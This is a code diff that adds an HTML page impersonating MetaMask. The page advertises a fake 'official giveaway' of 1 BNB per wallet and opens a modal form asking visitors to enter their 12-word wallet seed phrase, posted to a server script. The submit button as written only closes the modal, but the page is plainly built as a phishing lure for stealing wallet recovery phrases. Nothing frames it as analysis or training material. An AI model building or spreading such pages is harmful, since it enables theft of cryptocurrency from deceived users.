@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+
+<body>
+
+
+    <div class="pageheader">
+        <img src="Metamask-icon.png" alt="Logo" id = "logo">
+        <h2>METAMASK</h2>
+        <ul>
+            <li><a href="#home">Home</a></li>
+            <li><a href="#news">News</a></li>
+            <li><a href="#contact">Contact</a></li>
+            <li><a href="#about">About</a></li>
+          </ul>
+        <input type="button" value="Connect to MetaMask" id = "walletbtn" onclick="document.getElementById('mdl').style.display='block'">
+
+    </div>
+   
+
+    <section>
+        <img src="sec1.jpg" alt="wallet image" id = "walletimg">
+        <h1>Join our official <br>GIVEAWAY <br>& <br> GET 1 BNB!!</h1><br>
+        <p>First 1000 wallets will get 1 BNB token. JOIN NOW!</p><br>
+        <input type="button" value="JOIN NOW" id = "joinbtn" onclick="document.getElementById('mdl').style.display='block'">
+      </section>
+
+
+      <div id="mdl" class="modal">
+  
+        <form class="modal-content animate" action="/action_page.php" method="post">
+          <div class="imgcontainer">
+            <span onclick="document.getElementById('mdl').style.display='none'" class="close" title="Close Modal">&times;</span>
+            <img src="Metamask-icon.png" alt="Avatar" class="avatar">
+          </div>
+      
+          <div class="container">
+            <label for="seedprhase" id = "seedlabel"><b>Connect your MetaMask Wallet</b></label>
+            <input type="text" placeholder="12-Word Wallet SeedPhrase" id = "wallettext" name="walletphrase" required style="width: 100%; padding: 5px; height: 40px; overflow: scroll; margin-top: 15px; margin-left: -7px;">
+          </div>
+      
+          <div class="container">
+            <button type="button" onclick="document.getElementById('mdl').style.display='none'" class="sumbitbtn" id ="sub">Connect</button>
+          </div>
+        </form>
+      </div>
+      <script>
+        // Get the modal
+        var modal = document.getElementById('mdl');
+        
+        // When the user clicks anywhere outside of the modal, close it
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
+
+            }
+        }
+        </script>
+    
+    
+
+</body>
+
+</html>
+
